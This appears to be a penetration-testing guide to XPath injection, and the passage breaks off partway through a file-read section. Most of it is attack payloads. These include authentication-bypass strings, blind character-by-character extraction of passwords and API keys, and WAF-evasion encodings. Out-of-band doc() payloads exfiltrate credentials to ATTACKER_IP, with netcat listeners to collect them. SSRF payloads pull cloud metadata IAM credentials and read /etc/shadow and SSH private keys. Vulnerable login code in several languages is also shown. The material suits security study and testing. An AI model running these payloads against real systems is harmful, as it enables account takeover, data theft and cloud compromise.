---
title: XPath Injection
description: Complete guide to XPath Injection — payloads, authentication bypass, data extraction, blind exploitation, error-based techniques, privilege escalation, and defense for penetration testers and security researchers.
navigation:
  icon: i-lucide-file-search
  title: XPath Injection
---

## What is XPath?

XPath (XML Path Language) is a **query language** designed to navigate and select nodes from an XML document. It functions similarly to SQL for relational databases but operates on **XML data structures** instead of tables. XPath is a core component of XSLT, XQuery, and many web application frameworks that store or process data in XML format.

XML databases and XML-backed authentication systems are common in legacy enterprise applications, SOAP-based web services, content management systems, and configuration-driven applications.

::tabs
  :::tabs-item{icon="i-lucide-eye" label="XML Document Example"}
  ```xml [users.xml]
  <?xml version="1.0" encoding="UTF-8"?>
  <users>
    <user>
      <id>1</id>
      <username>admin</username>
      <password>s3cur3P@ss!</password>
      <role>administrator</role>
      <email>admin@target.com</email>
      <apikey>ak-9f8e7d6c5b4a3210</apikey>
    </user>
    <user>
      <id>2</id>
      <username>john</username>
      <password>john2024!</password>
      <role>editor</role>
      <email>john@target.com</email>
      <apikey>ak-1a2b3c4d5e6f7890</apikey>
    </user>
    <user>
      <id>3</id>
      <username>guest</username>
      <password>guestPass</password>
      <role>viewer</role>
      <email>guest@target.com</email>
      <apikey>ak-0000000000000000</apikey>
    </user>
    <user>
      <id>4</id>
      <username>svc_backup</username>
      <password>B@ckup2024!Root</password>
      <role>service</role>
      <email>backup@target.com</email>
      <apikey>ak-ffffffffffffffff</apikey>
    </user>
  </users>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="XPath Query Examples"}
  ```text [Select all users]
  /users/user
  ```

  ```text [Select admin username]
  /users/user[username='admin']/password
  ```

  ```text [Login authentication query]
  /users/user[username='INPUT_USER' and password='INPUT_PASS']
  ```

  ```text [Select by attribute]
  /users/user[@id='1']
  ```

  ```text [Select all usernames]
  //username
  ```

  ```text [Select user with role administrator]
  /users/user[role='administrator']
  ```
  :::
::

::callout{icon="i-lucide-info" color="blue"}
Unlike SQL databases, XML documents have **no access control layer**. Once you can query the XML document, you can access **every node** in the entire document tree. There are no permissions, no roles, and no privilege separation within the XML data itself.
::

---

## How XPath Injection Works

XPath Injection occurs when an application constructs XPath queries using **unsanitized user input**. The attacker manipulates the query logic by injecting XPath syntax, altering the query's behavior to bypass authentication, extract data, or enumerate the entire XML document structure.

::note
XPath Injection is conceptually similar to SQL Injection but targets XML data stores. The critical difference is that XPath has **no UPDATE, INSERT, or DELETE** operations — it is read-only. However, complete data extraction is possible, and the extracted data often contains credentials that lead to further compromise.
::

### Vulnerable Code Patterns

Understanding how applications build XPath queries reveals the injection surface.

::tabs
  :::tabs-item{icon="i-lucide-code" label="PHP (Vulnerable)"}
  ```php [login.php]
  <?php
  $xml = simplexml_load_file("users.xml");
  
  $username = $_POST['username'];
  $password = $_POST['password'];
  
  // VULNERABLE — Direct concatenation of user input
  $query = "/users/user[username='" . $username . "' and password='" . $password . "']";
  
  $result = $xml->xpath($query);
  
  if ($result) {
      echo "Welcome, " . $result[0]->username;
      $_SESSION['role'] = (string)$result[0]->role;
  } else {
      echo "Invalid credentials.";
  }
  ?>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Python (Vulnerable)"}
  ```python [app.py]
  from lxml import etree
  from flask import Flask, request

  app = Flask(__name__)
  tree = etree.parse("users.xml")

  @app.route("/login", methods=["POST"])
  def login():
      username = request.form.get("username")
      password = request.form.get("password")
      
      # VULNERABLE — Direct string formatting
      query = f"/users/user[username='{username}' and password='{password}']"
      
      result = tree.xpath(query)
      
      if result:
          return f"Welcome, {result[0].find('username').text}"
      return "Invalid credentials."
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Java (Vulnerable)"}
  ```java [LoginServlet.java]
  import javax.xml.xpath.*;
  import org.xml.sax.InputSource;

  public class LoginServlet extends HttpServlet {
      protected void doPost(HttpServletRequest request, HttpServletResponse response) {
          String username = request.getParameter("username");
          String password = request.getParameter("password");
          
          // VULNERABLE — Direct concatenation
          String query = "/users/user[username='" + username + "' and password='" + password + "']";
          
          XPathFactory factory = XPathFactory.newInstance();
          XPath xpath = factory.newXPath();
          InputSource source = new InputSource("users.xml");
          
          NodeList nodes = (NodeList) xpath.evaluate(query, source, XPathConstants.NODESET);
          
          if (nodes.getLength() > 0) {
              // Authenticated
          }
      }
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label=".NET (Vulnerable)"}
  ```csharp [LoginController.cs]
  using System.Xml;

  public class LoginController : Controller
  {
      [HttpPost]
      public IActionResult Login(string username, string password)
      {
          XmlDocument doc = new XmlDocument();
          doc.Load("users.xml");
          
          // VULNERABLE — Direct concatenation
          string query = $"/users/user[username='{username}' and password='{password}']";
          
          XmlNodeList nodes = doc.SelectNodes(query);
          
          if (nodes.Count > 0)
          {
              return Ok("Authenticated");
          }
          return Unauthorized();
      }
  }
  ```
  :::
::

### Injection Mechanics

When the application builds this query:

```text
/users/user[username='INPUT' and password='INPUT']
```

An attacker inputs `' or '1'='1` as the username, transforming the query into:

```text
/users/user[username='' or '1'='1' and password='' or '1'='1']
```

Since `'1'='1'` is **always true**, the query returns **all user nodes**, and the application authenticates the attacker as the **first user** in the XML document (typically the administrator).

::steps{level="4"}

#### Original Query Structure

```text
/users/user[username='[USER_INPUT]' and password='[PASS_INPUT]']
```

The application expects legitimate username and password values.

#### Attacker Injects Payload

The attacker submits:
- **Username:** `' or '1'='1`
- **Password:** `' or '1'='1`

#### Modified Query After Injection

```text
/users/user[username='' or '1'='1' and password='' or '1'='1']
```

The boolean logic is subverted. The `or '1'='1'` clause makes the entire predicate evaluate to **true** for every `<user>` node.

#### Application Processes All Results

The XPath engine returns **every user node**. The application takes the **first result** and authenticates the attacker, typically as the first user defined in the XML — which is almost always the **administrator**.

::

---

## Detection & Identification

Before exploitation, you must confirm XPath is being used and identify injectable parameters.

::card-group
  ::card
  ---
  title: Technology Fingerprinting
  icon: i-lucide-fingerprint
  ---
  Look for XML-based responses, SOAP endpoints, `.xml` file references, and error messages mentioning XPath, XSLT, `SimpleXMLElement`, `lxml`, or `XPathExpression`.
  ::

  ::card
  ---
  title: Error Message Analysis
  icon: i-lucide-alert-circle
  ---
  Submit a single quote `'` in input fields. XPath errors reveal the query structure. Look for messages like `Invalid expression`, `XPathException`, `unterminated string literal`, or `Invalid predicate`.
  ::

  ::card
  ---
  title: Boolean Response Differential
  icon: i-lucide-toggle-left
  ---
  Submit payloads that produce **true** vs **false** conditions. If the application response changes (login success vs failure, data shown vs hidden), XPath injection is likely.
  ::

  ::card
  ---
  title: Input Reflection in XML
  icon: i-lucide-text-cursor-input
  ---
  If any input is processed through XML parsing, XPath queries may be constructed dynamically. Test all parameters in XML/SOAP request bodies.
  ::

  ::card
  ---
  title: Time-Based Detection
  icon: i-lucide-clock
  ---
  While XPath has no native `SLEEP()` function, complex recursive queries or string operations on large XML documents can create measurable response time differences.
  ::

  ::card
  ---
  title: WSDL/Schema Discovery
  icon: i-lucide-file-code
  ---
  For SOAP services, request the WSDL file. It reveals the XML structure, data types, and operations — providing a blueprint for crafting XPath injection payloads.
  ::
::

### Detection Payloads

Use these payloads to confirm XPath injection vulnerability.

::code-group
```text [Single Quote Error Test]
'
```

```text [Double Quote Error Test]
"
```

```text [Boolean True Test]
' or '1'='1
```

```text [Boolean False Test]
' and '1'='2
```

```text [Numeric True Test]
' or 1=1 or '1'='1
```

```text [Comment-style Test]
' or ''='
```

```text [String Comparison Test]
' or 'a'='a
```

```text [XPath Function Test]
' or string-length('a')=1 or 'a'='a
```

```text [Parentheses Test]
') or ('1'='1
```

```text [Close and Reopen Predicate]
'] or ['1'='1
```
::

::tip
If submitting `' or '1'='1` produces a **different response** than `' or '1'='2`, the parameter is vulnerable to XPath injection. The first payload creates a **true** condition; the second creates a **false** condition.
::

---

## Payloads

::note
All payloads are organized by attack category. Each section progresses from simple to advanced techniques. Replace `INPUT_FIELD` with the actual injectable parameter value.
::

### Authentication Bypass Payloads

These payloads subvert login logic by making the XPath predicate evaluate to **true** for all nodes.

::collapsible
---
label: "Basic Authentication Bypass"
---

```text [Classic OR Bypass — Username Field]
' or '1'='1
```

```text [Classic OR Bypass — Both Fields]
Username: ' or '1'='1
Password: ' or '1'='1
```

```text [OR with Empty String]
' or ''='
```

```text [OR with True() Function]
' or true() or '
```

```text [Numeric OR]
' or 1=1 or '1'='1
```

```text [String Equality Bypass]
' or 'a'='a
```

```text [String-length Bypass]
' or string-length('x')=1 or 'a'='a
```

```text [Position Bypass]
' or position()=1 or 'a'='a
```

```text [Count Bypass]
' or count(//user)>0 or 'a'='a
```

```text [Normalize-space Bypass]
' or normalize-space('a')='a' or '1'='1
```

```text [Contains Function Bypass]
' or contains('abc','a') or 'x'='x
```

```text [Starts-with Function Bypass]
' or starts-with('admin','a') or 'x'='x
```

```text [Boolean Number Bypass]
' or number('1')=1 or 'a'='a
```

```text [Not Function Bypass]
' or not(false()) or '1'='1
```

```text [Double OR Chain]
' or '1'='1' or '1'='1
```
::

::collapsible
---
label: "Advanced Authentication Bypass"
---

```text [Comment Out Password Check (if supported)]
' or '1'='1' | //user['
```

```text [Login as Specific User — admin]
admin' or '1'='1
```

```text [Login as Specific User — Bypass Password]
admin' and '1'='1' or '1'='1
```

```text [Bypass with Wildcard Node Selection]
' or //user or '1'='1
```

```text [Predicate Escape — Close Bracket]
'] or ['1'='1
```

```text [Parentheses Escape]
') or ('1'='1
```

```text [Double Parentheses Escape]
')) or (('1'='1
```

```text [Nested Predicate Injection]
' or substring('a',1,1)='a' or '1'='1
```

```text [Concat Function Bypass]
' or concat('1','1')='11' or 'a'='a
```

```text [Translate Function Bypass]
' or translate('abc','abc','ABC')='ABC' or 'x'='x
```

```text [Login as First User (Positional)]
' or position()=1 and '1'='1
```

```text [Login as Last User (Positional)]
' or position()=last() or '1'='1
```

```text [Login as Second User]
' or position()=2 and '1'='1
```

```text [Boolean AND True Bypass]
' and '1'='1' or '1'='1' and '1'='1
```

```text [Null Byte Termination (parser dependent)]
' or '1'='1'%00
```

```text [Unicode Single Quote Bypass]
%27 or %271%27=%271
```

```text [URL Encoded Full Payload]
%27%20or%20%271%27%3D%271
```

```text [Double URL Encoded]
%2527%2520or%2520%25271%2527%253D%25271
```

```text [HTML Entity Encoded Quote]
&apos; or &apos;1&apos;=&apos;1
```

```text [XML Entity Quote Bypass]
&#39; or &#39;1&#39;=&#39;1
```

```text [Hex Encoded Quote]
&#x27; or &#x27;1&#x27;=&#x27;1
```

```text [Tab Character Insertion]
'	or	'1'='1
```

```text [Newline Insertion]
'%0aor%0a'1'='1
```

```text [Carriage Return + Newline]
'%0d%0aor%0d%0a'1'='1
```
::

::collapsible
---
label: "Login as Specific Roles"
---

```text [Login as Administrator Role]
' or role='administrator' or '1'='1
```

```text [Login as Any User with Admin in Role]
' or contains(role,'admin') or '1'='1
```

```text [Login as Root User]
' or username='root' or '1'='1
```

```text [Login as Service Account]
' or starts-with(username,'svc_') or '1'='1
```

```text [Login as User with Specific Email Domain]
' or contains(email,'@target.com') and role='administrator' or '1'='1
```

```text [Bypass Login — Select by ID]
' or id='1' or '1'='1
```

```text [Bypass Login — Select Last User]
' or id=last() or '1'='1
```
::

### Data Extraction Payloads

These payloads extract data from the XML document when the application reflects query results.

::collapsible
---
label: "Direct Data Extraction (In-Band)"
---

```text [Extract All Usernames]
'] | //username | //user['
```

```text [Extract All Passwords]
'] | //password | //user['
```

```text [Extract All Emails]
'] | //email | //user['
```

```text [Extract All Roles]
'] | //role | //user['
```

```text [Extract All API Keys]
'] | //apikey | //user['
```

```text [Extract All User Nodes]
'] | //user | //user['
```

```text [Extract All Node Names]
'] | //* | //user['
```

```text [Extract Root Element]
'] | /* | //user['
```

```text [Extract All Text Content]
'] | //text() | //user['
```

```text [Extract All Attributes]
'] | //@* | //user['
```

```text [Extract Specific User Data by Position]
'] | //user[1]/password | //user['
```

```text [Extract Second User Password]
'] | //user[2]/password | //user['
```

```text [Extract Third User Data]
'] | //user[3]/* | //user['
```

```text [Extract Admin Password Specifically]
'] | //user[username='admin']/password | //user['
```

```text [Extract All Child Elements of First User]
'] | //user[1]/* | //user['
```

```text [Extract Document Root Name]
'] | name(/*) | //user['
```

```text [UNION-style — Select Everything]
'] | //* | //*['
```

```text [Extract Comments in XML]
'] | //comment() | //user['
```

```text [Extract Processing Instructions]
'] | //processing-instruction() | //user['
```
::

::collapsible
---
label: "Data Extraction via String Functions"
---

```text [Extract Username Length]
' or string-length(//user[1]/username)>0 or '1'='1
```

```text [Extract First Character of Username]
' or substring(//user[1]/username,1,1)='a' or '1'='1
```

```text [Extract Second Character of Username]
' or substring(//user[1]/username,2,1)='d' or '1'='1
```

```text [Extract Full Username Character by Character]
' or substring(//user[1]/username,1,1)='a' and '1'='1
' or substring(//user[1]/username,2,1)='d' and '1'='1
' or substring(//user[1]/username,3,1)='m' and '1'='1
' or substring(//user[1]/username,4,1)='i' and '1'='1
' or substring(//user[1]/username,5,1)='n' and '1'='1
```

```text [Extract Password First Character]
' or substring(//user[1]/password,1,1)='s' or '1'='1
```

```text [Check if Username Contains String]
' or contains(//user[1]/username,'admin') or '1'='1
```

```text [Check if Username Starts With]
' or starts-with(//user[1]/username,'adm') or '1'='1
```

```text [Compare Strings — Before/After]
' or //user[1]/username > 'a' or '1'='1
```

```text [Concat Extraction]
' or concat(//user[1]/username,':',//user[1]/password)!='' or '1'='1
```
::

### Blind XPath Injection Payloads

When the application does **not** reflect query results in the response, use blind techniques that infer data from **boolean response differences** (login success/failure, content presence/absence, HTTP status codes).

::caution
Blind XPath injection requires **many requests** to extract data character by character. Automate with scripts or tools for efficiency.
::

::collapsible
---
label: "Boolean-Based Blind — Document Structure Enumeration"
---

```text [Count Root Child Nodes]
' or count(/*)=1 or '1'='2
' or count(/*)=2 or '1'='2
```

```text [Root Element Name Length]
' or string-length(name(/*))=5 or '1'='2
' or string-length(name(/*))=6 or '1'='2
```

```text [Root Element Name — First Character]
' or substring(name(/*),1,1)='u' or '1'='2
' or substring(name(/*),1,1)='a' or '1'='2
```

```text [Root Element Name — Second Character]
' or substring(name(/*),2,1)='s' or '1'='2
```

```text [Count Child Nodes of Root]
' or count(/*/*)=4 or '1'='2
' or count(//user)=4 or '1'='2
```

```text [First Child Element Name Length]
' or string-length(name(/*/*[1]))=4 or '1'='2
```

```text [First Child Element Name — Character by Character]
' or substring(name(/*/*[1]),1,1)='u' or '1'='2
' or substring(name(/*/*[1]),2,1)='s' or '1'='2
' or substring(name(/*/*[1]),3,1)='e' or '1'='2
' or substring(name(/*/*[1]),4,1)='r' or '1'='2
```

```text [Count Grandchild Elements]
' or count(/*/*[1]/*)=6 or '1'='2
```

```text [Grandchild Element Name]
' or substring(name(/*/*[1]/*[1]),1,1)='i' or '1'='2
' or substring(name(/*/*[1]/*[1]),2,1)='d' or '1'='2
```

```text [Second Grandchild Name]
' or substring(name(/*/*[1]/*[2]),1,1)='u' or '1'='2
```

```text [Enumerate All Child Element Names]
' or name(/*/*[1]/*[1])='id' or '1'='2
' or name(/*/*[1]/*[2])='username' or '1'='2
' or name(/*/*[1]/*[3])='password' or '1'='2
' or name(/*/*[1]/*[4])='role' or '1'='2
' or name(/*/*[1]/*[5])='email' or '1'='2
' or name(/*/*[1]/*[6])='apikey' or '1'='2
```
::

::collapsible
---
label: "Boolean-Based Blind — Data Value Extraction"
---

```text [Username Length of First User]
' or string-length(//user[1]/username)=5 or '1'='2
' or string-length(//user[1]/username)=4 or '1'='2
' or string-length(//user[1]/username)>3 or '1'='2
' or string-length(//user[1]/username)<6 or '1'='2
```

```text [Username Characters — First User]
' or substring(//user[1]/username,1,1)='a' or '1'='2
' or substring(//user[1]/username,2,1)='d' or '1'='2
' or substring(//user[1]/username,3,1)='m' or '1'='2
' or substring(//user[1]/username,4,1)='i' or '1'='2
' or substring(//user[1]/username,5,1)='n' or '1'='2
```

```text [Password Length of First User]
' or string-length(//user[1]/password)>8 or '1'='2
' or string-length(//user[1]/password)>10 or '1'='2
' or string-length(//user[1]/password)=12 or '1'='2
```

```text [Password Characters — First User]
' or substring(//user[1]/password,1,1)='s' or '1'='2
' or substring(//user[1]/password,2,1)='3' or '1'='2
' or substring(//user[1]/password,3,1)='c' or '1'='2
```

```text [Binary Search — Character Code Comparison]
' or substring(//user[1]/password,1,1)>'m' or '1'='2
' or substring(//user[1]/password,1,1)>'s' or '1'='2
' or substring(//user[1]/password,1,1)>'p' or '1'='2
```

```text [Extract Second User Password]
' or substring(//user[2]/password,1,1)='j' or '1'='2
```

```text [Extract Email of Admin]
' or substring(//user[username='admin']/email,1,1)='a' or '1'='2
```

```text [Extract Role of Second User]
' or //user[2]/role='editor' or '1'='2
' or //user[2]/role='admin' or '1'='2
' or //user[2]/role='viewer' or '1'='2
```

```text [Extract API Key — First Character]
' or substring(//user[1]/apikey,1,1)='a' or '1'='2
' or substring(//user[1]/apikey,2,1)='k' or '1'='2
' or substring(//user[1]/apikey,3,1)='-' or '1'='2
```

```text [Extract Total Number of Users]
' or count(//user)=1 or '1'='2
' or count(//user)=2 or '1'='2
' or count(//user)=3 or '1'='2
' or count(//user)=4 or '1'='2
```

```text [Check if Specific Username Exists]
' or //user[username='admin'] or '1'='2
' or //user[username='root'] or '1'='2
' or //user[username='test'] or '1'='2
' or //user[username='svc_backup'] or '1'='2
```

```text [Check if Specific Role Exists]
' or //user[role='administrator'] or '1'='2
' or //user[role='superadmin'] or '1'='2
' or //user[role='service'] or '1'='2
```
::

::collapsible
---
label: "Boolean-Based Blind — Full Extraction Character Set"
---

Use these templates to brute-force each character position against all printable characters:

```text [Lowercase Letters]
' or substring(//user[1]/password,POSITION,1)='a' or '1'='2
' or substring(//user[1]/password,POSITION,1)='b' or '1'='2
' or substring(//user[1]/password,POSITION,1)='c' or '1'='2
... through 'z'
```

```text [Uppercase Letters]
' or substring(//user[1]/password,POSITION,1)='A' or '1'='2
' or substring(//user[1]/password,POSITION,1)='B' or '1'='2
... through 'Z'
```

```text [Digits]
' or substring(//user[1]/password,POSITION,1)='0' or '1'='2
' or substring(//user[1]/password,POSITION,1)='1' or '1'='2
... through '9'
```

```text [Special Characters]
' or substring(//user[1]/password,POSITION,1)='!' or '1'='2
' or substring(//user[1]/password,POSITION,1)='@' or '1'='2
' or substring(//user[1]/password,POSITION,1)='#' or '1'='2
' or substring(//user[1]/password,POSITION,1)='$' or '1'='2
' or substring(//user[1]/password,POSITION,1)='_' or '1'='2
' or substring(//user[1]/password,POSITION,1)='-' or '1'='2
' or substring(//user[1]/password,POSITION,1)='.' or '1'='2
```

Replace `POSITION` with 1, 2, 3, ... up to the string length.
::

### Error-Based XPath Injection

When the application displays **error messages**, malformed XPath can leak data through error output.

::collapsible
---
label: "Error-Based Extraction Payloads"
---

```text [Trigger Basic Error]
'
```

```text [Unmatched Bracket Error]
']
```

```text [Unmatched Parenthesis Error]
')
```

```text [Invalid Function Error]
' or invalid_function() or '1'='1
```

```text [Division by Zero (Type Error)]
' or 1 div 0 or '1'='1
```

```text [Type Coercion Error — String to Number]
' or number(//user[1]/username) or '1'='1
```

```text [Nested Query Error Leak]
' or //user[username=concat('',//user[1]/password,'')] or '1'='1
```

```text [Malformed Predicate]
' and [invalid or '1'='1
```

```text [Multiple Close Brackets]
']]]
```

```text [Deeply Nested Error]
' or (/(/(/invalid))) or '1'='1
```

```text [String Conversion Error]
' or string(//user[position()=0/0]) or '1'='1
```
::

::tip
Error-based extraction depends heavily on the application's error handling. Verbose errors may reveal the **full XPath query**, **XML structure**, **node names**, or **data values** directly in the error message.
::

### XPath 2.0 Specific Payloads

XPath 2.0 introduces additional functions and capabilities that expand the attack surface.

::warning
XPath 2.0 payloads only work if the target application uses an XPath 2.0 compatible processor (Saxon, BaseX, eXist-db, MarkLogic, etc.). Most basic XML parsers in PHP and Python use XPath 1.0.
::

::collapsible
---
label: "XPath 2.0 Extended Payloads"
---

```text [Matches — Regex String Comparison]
' or matches(//user[1]/password,'^s3c') or '1'='2
```

```text [Matches — Any Character Wildcard]
' or matches(//user[1]/password,'.*') or '1'='2
```

```text [Matches — Check for Digits in Password]
' or matches(//user[1]/password,'\d+') or '1'='2
```

```text [Matches — Case Insensitive]
' or matches(//user[1]/username,'ADMIN','i') or '1'='2
```

```text [Replace Function]
' or replace(//user[1]/username,'admin','hacked')='hacked' or '1'='2
```

```text [Tokenize — Split by Delimiter]
' or tokenize(//user[1]/email,'@')[2]='target.com' or '1'='2
```

```text [Lower-case Function]
' or lower-case(//user[1]/role)='administrator' or '1'='2
```

```text [Upper-case Function]
' or upper-case(//user[1]/username)='ADMIN' or '1'='2
```

```text [String-join (Concatenate Multiple Values)]
' or string-join(//username,',')!='' or '1'='2
```

```text [Ends-with Function]
' or ends-with(//user[1]/email,'@target.com') or '1'='2
```

```text [Compare Function]
' or compare(//user[1]/username,'admin')=0 or '1'='2
```

```text [Codepoints-to-string (Character Code)]
' or codepoints-to-string(97)='a' or '1'='2
```

```text [String-to-codepoints (Get Character Code)]
' or string-to-codepoints(substring(//user[1]/password,1,1))=115 or '1'='2
```

```text [Subsequence — Select Range of Nodes]
' or count(subsequence(//user,1,2))=2 or '1'='2
```

```text [Distinct-values — Unique Roles]
' or count(distinct-values(//role))>2 or '1'='2
```

```text [Doc Function — External File Read (if allowed)]
' or doc('file:///etc/passwd') or '1'='2
```

```text [Doc Function — HTTP Request (SSRF)]
' or doc('http://ATTACKER_IP/xxe_callback') or '1'='2
```

```text [Collection Function]
' or collection('file:///var/www/')!='' or '1'='2
```

```text [Environment-variable (Saxon specific)]
' or environment-variable('PATH')!='' or '1'='2
```

```text [Unparsed-text — Read External Files (XPath 3.0)]
' or unparsed-text('file:///etc/passwd')!='' or '1'='2
```
::

### Out-of-Band (OOB) XPath Injection

When neither in-band nor blind techniques produce results, XPath 2.0 `doc()` function can be used for **out-of-band data exfiltration** via HTTP requests to an attacker-controlled server.

::collapsible
---
label: "Out-of-Band Exfiltration Payloads"
---

```text [Basic OOB — Trigger HTTP Request]
' or doc(concat('http://ATTACKER_IP:8888/',//user[1]/password)) or '1'='2
```

```text [OOB — Exfiltrate Username]
' or doc(concat('http://ATTACKER_IP:8888/user=',//user[1]/username)) or '1'='2
```

```text [OOB — Exfiltrate Role]
' or doc(concat('http://ATTACKER_IP:8888/role=',//user[1]/role)) or '1'='2
```

```text [OOB — Exfiltrate Email]
' or doc(concat('http://ATTACKER_IP:8888/email=',//user[1]/email)) or '1'='2
```

```text [OOB — Exfiltrate API Key]
' or doc(concat('http://ATTACKER_IP:8888/key=',//user[1]/apikey)) or '1'='2
```

```text [OOB — Exfiltrate All Users Iteratively]
' or doc(concat('http://ATTACKER_IP:8888/u1=',//user[1]/username,'&p1=',//user[1]/password)) or '1'='2
' or doc(concat('http://ATTACKER_IP:8888/u2=',//user[2]/username,'&p2=',//user[2]/password)) or '1'='2
' or doc(concat('http://ATTACKER_IP:8888/u3=',//user[3]/username,'&p3=',//user[3]/password)) or '1'='2
```

```text [OOB — File Read via doc()]
' or doc('file:///etc/hostname') or '1'='2
```

```text [OOB — SSRF to Internal Network]
' or doc('http://192.168.1.1/') or '1'='2
' or doc('http://10.0.0.1/') or '1'='2
' or doc('http://169.254.169.254/latest/meta-data/') or '1'='2
```

```text [OOB — DNS Exfiltration]
' or doc(concat('http://',//user[1]/password,'.ATTACKER_DOMAIN/')) or '1'='2
```

Set up a listener on your attacker machine:

```bash [Attacker Listener]
python3 -m http.server 8888
```

Or use Netcat:

```bash [Netcat Listener]
nc -lvnp 8888
```

The extracted data will appear in the HTTP request path logged by your listener.
::

### SOAP / XML Web Service Injection

Many enterprise applications expose SOAP-based web services that construct XPath queries internally.

::collapsible
---
label: "SOAP Request Injection Payloads"
---

```xml [Basic SOAP XPath Injection]
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://target.com/webservice">
   <soapenv:Body>
      <web:GetUser>
         <web:username>' or '1'='1</web:username>
         <web:password>' or '1'='1</web:password>
      </web:GetUser>
   </soapenv:Body>
</soapenv:Envelope>
```

```xml [SOAP — Extract Data via UNION]
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://target.com/webservice">
   <soapenv:Body>
      <web:SearchUser>
         <web:query>'] | //password | //user['</web:query>
      </web:SearchUser>
   </soapenv:Body>
</soapenv:Envelope>
```

```xml [SOAP — Boolean Blind Test]
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://target.com/webservice">
   <soapenv:Body>
      <web:GetUser>
         <web:username>' or count(//user)>3 or '1'='2</web:username>
         <web:password>anything</web:password>
      </web:GetUser>
   </soapenv:Body>
</soapenv:Envelope>
```

```xml [REST/JSON to XPath — Parameter Injection]
{
  "username": "' or '1'='1",
  "password": "' or '1'='1"
}
```
::

### Filter Bypass & Evasion Payloads

::collapsible
---
label: "WAF & Input Filter Bypass Techniques"
---

```text [URL Encoded Single Quote]
%27 or %271%27=%271
```

```text [Double URL Encoding]
%2527 or %25271%2527=%25271
```

```text [HTML Entity — Named]
&apos; or &apos;1&apos;=&apos;1
```

```text [HTML Entity — Decimal]
&#39; or &#39;1&#39;=&#39;1
```

```text [HTML Entity — Hex]
&#x27; or &#x27;1&#x27;=&#x27;1
```

```text [Unicode Encoding]
\u0027 or \u00271\u0027=\u00271
```

```text [UTF-7 Encoding]
+ACc- or +ACc-1+ACc-=+ACc-1
```

```text [Tab Instead of Space]
'%09or%09'1'='1
```

```text [Newline Instead of Space]
'%0aor%0a'1'='1
```

```text [Carriage Return Instead of Space]
'%0dor%0d'1'='1
```

```text [Multiple Spaces]
'    or    '1'='1
```

```text [No Spaces — Using Parentheses]
'or(true())or'1'='1
```

```text [Avoid Quotes — Use Double Quotes (if single filtered)]
" or "1"="1
```

```text [Avoid OR keyword — Use Pipe Operator]
'] | //user | //nothing['
```

```text [Avoid Equals — Use Contains]
' or contains(username,'admin') or contains('1','1
```

```text [Avoid Quotes — Numeric Comparison Only]
1 or 1=1
```

```text [Case Variation (parser dependent)]
' OR '1'='1
' Or '1'='1
' oR '1'='1
```

```text [Null Byte Injection]
' or '1'='1'%00
```

```text [Backslash Escape Bypass]
\' or \'1\'=\'1
```

```text [Comment Injection (not standard XPath but some parsers)]
' or '1'='1' (: comment :) or '1'='1
```

```text [Concat to Build String (Avoid Direct Keyword)]
' or concat('tr','ue')='true' or '1'='1
```
::

---

## Privilege Escalation via XPath Injection

::note
XPath Injection is a **read-only** attack — you cannot modify XML data through XPath queries. However, the data extracted (credentials, API keys, tokens, internal paths) frequently enables **vertical and horizontal privilege escalation** across the broader application and infrastructure.
::

### How XPath Injection Leads to PrivEsc

::card-group
  ::card
  ---
  title: "Credential Harvesting"
  icon: i-lucide-key-round
  ---
  XML data stores often contain **plaintext passwords**, password hashes, API keys, and tokens. Extracted credentials can be reused for SSH, RDP, database access, admin panels, or cloud API authentication.
  ::

  ::card
  ---
  title: "Role Manipulation"
  icon: i-lucide-shield-alert
  ---
  If the application reads the user's **role** from the XPath query result, authentication bypass payloads that return an administrator user node grant **immediate admin access** to the application.
  ::

  ::card
  ---
  title: "Horizontal Escalation"
  icon: i-lucide-arrow-right-left
  ---
  Extract other users' data (sessions, tokens, personal information) to **impersonate** them. Access other users' accounts, data, and permissions.
  ::

  ::card
  ---
  title: "Infrastructure Pivot"
  icon: i-lucide-network
  ---
  Extracted database credentials, internal hostnames, API endpoints, and service account passwords enable lateral movement to backend systems, databases, and internal services.
  ::

  ::card
  ---
  title: "File Read via XPath 2.0"
  icon: i-lucide-file-key
  ---
  XPath 2.0 `doc()` and `unparsed-text()` functions can read **local files** on the server. Extract `/etc/shadow`, SSH keys, application configs, and `.env` files for credential harvesting.
  ::

  ::card
  ---
  title: "SSRF via doc()"
  icon: i-lucide-globe
  ---
  The `doc()` function can make **HTTP requests** to internal services (cloud metadata, internal APIs, admin panels) that are not accessible from the external network.
  ::
::

### PrivEsc Exploitation Chain

::steps{level="4"}

#### Extract All Credentials from XML

```text
'] | //user/username | //user/password | //user['
```

Or blind extraction character by character for each user.

#### Identify Admin/Service Accounts

```text
' or //user[role='administrator']/username or '1'='2
' or //user[role='service']/username or '1'='2
' or //user[contains(role,'admin')]/password or '1'='2
```

#### Test Credential Reuse

Attempt extracted credentials against:

| Target | Protocol |
|--------|----------|
| SSH | `ssh admin@target -p 22` |
| RDP | `xfreerdp /u:admin /p:password /v:target` |
| Database | `mysql -u admin -p'password' -h target` |
| Admin Panel | `https://target/admin` |
| API | `curl -H "Authorization: Bearer API_KEY" https://target/api/v1/users` |
| Cloud Metadata | Via SSRF with `doc()` |

#### Exploit Service Accounts

Service accounts (`svc_backup`, `svc_deploy`, etc.) often have:
- Elevated filesystem permissions
- Sudo access for specific tools
- Access to backup systems, CI/CD pipelines, or deployment tools
- Scheduled tasks running as root

```text [Extract Service Account Credentials]
' or substring(//user[starts-with(username,'svc')]/password,1,1)='B' or '1'='2
```

#### SSRF to Cloud Metadata (XPath 2.0)

```text [AWS Metadata]
' or doc('http://169.254.169.254/latest/meta-data/iam/security-credentials/') or '1'='2
```

```text [GCP Metadata]
' or doc('http://metadata.google.internal/computeMetadata/v1/') or '1'='2
```

```text [Azure Metadata]
' or doc('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01') or '1'='2
```

Cloud metadata endpoints expose **IAM credentials**, access tokens, and instance profiles that grant cloud-level privilege escalation.

#### Local File Read for Further Credentials (XPath 2.0)

```text [Read /etc/shadow]
' or doc('file:///etc/shadow') or '1'='2
```

```text [Read SSH Private Key]
' or doc('file:///root/.ssh/id_rsa') or '1'='2
```

```text [Read Application Config]
